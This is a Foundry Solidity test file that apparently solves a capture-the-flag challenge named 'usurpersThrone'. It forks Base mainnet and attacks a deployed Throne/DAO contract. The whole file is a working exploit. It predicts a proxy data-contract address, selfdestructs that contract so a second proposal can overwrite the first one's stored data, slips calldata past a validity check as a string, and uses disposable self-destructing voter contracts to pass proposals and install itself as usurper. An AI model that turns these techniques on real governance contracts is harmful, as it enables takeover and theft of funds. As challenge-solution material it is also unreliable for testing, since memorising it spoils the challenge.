// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/usurpersThrone.sol";

contract voter {
	constructor(DAO dao, uint256 id) {
		dao.vote(id);
		selfdestruct(payable(msg.sender));
	}
}

contract usurpersThroneTest is Test {
    Throne public throne;
    DAO public dao;
    bytes32 private constant SLOT_KEY_PREFIX = 0x06fccbac10f612a9037c3e903b4f4bd03ffbc103781cbe821d25b33299e50efb;
    bytes32 internal constant KECCAK256_PROXY_CHILD_BYTECODE = 0x648b59bcbb41c37892d3b820522dc8b8c275316bb020f043a9068f607abeb810;
    uint256 id = 1337;

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org", 6753058);
        throne = Throne(0x6d353b5FB19d63791FAf8a2e4B5Fa8D32519a8A3);
        dao = DAO(throne.dao());
        
        // the calldata for forgeThrone will be written as bytecode of a contract, so make it ff for selfdestruct, the function signature of it is 6d2cd781 which is just push14
        bytes memory forgeThrone = abi.encodeWithSignature("forgeThrone(uint256)", type(uint256).max);
        bytes memory addUsurper = abi.encodeWithSignature("addUsurper(address)", uint256(uint160(address(this))));
        dao.createProposal(uint(keccak256(abi.encode(id,id))), address(throne), forgeThrone, string(addUsurper));
        bytes32 _key = bytes32(uint(keccak256(abi.encode(id,id))));
        address dataContractDeployer = address(uint160(uint256(keccak256(abi.encodePacked(hex"ff", address(dao), keccak256(abi.encode(SLOT_KEY_PREFIX, _key)), KECCAK256_PROXY_CHILD_BYTECODE)))));
        address dataContract =  address(uint160(uint256(keccak256(abi.encodePacked(hex"d694", dataContractDeployer, hex"01")))));
        console.logBytes(address(dataContractDeployer).code);
        console.logBytes(address(dataContract).code);
        // selfdestruct the data contract for the first proposal, so second can create the same proxy and overwrite the first proposal's data
        address(dataContract).call("");
    }

    function testSolve() public {
        bytes memory forgeThrone = abi.encodeWithSignature("forgeThrone(uint256)", uint256(keccak256(abi.encode(address(this)))));
        bytes memory addUsurper = abi.encodeWithSignature("addUsurper(address)", uint256(uint160(address(this))));
        // use calldata as string to overwrite first proposal's data without being checked for validData
        dao.createProposal(id, address(throne), forgeThrone, string(addUsurper));
        
        for (uint i; i<2; ++i) {
            new voter(dao, id);
        }
        dao.execute(id);
        for (uint i; i<2; ++i) {
            new voter(dao, uint(keccak256(abi.encode(id,id))));
        }
        dao.execute(uint(keccak256(abi.encode(id,id))));
        assertTrue(throne.verify(uint256(uint160(address(this))), uint256(keccak256(abi.encode(address(this))))));
    }
}

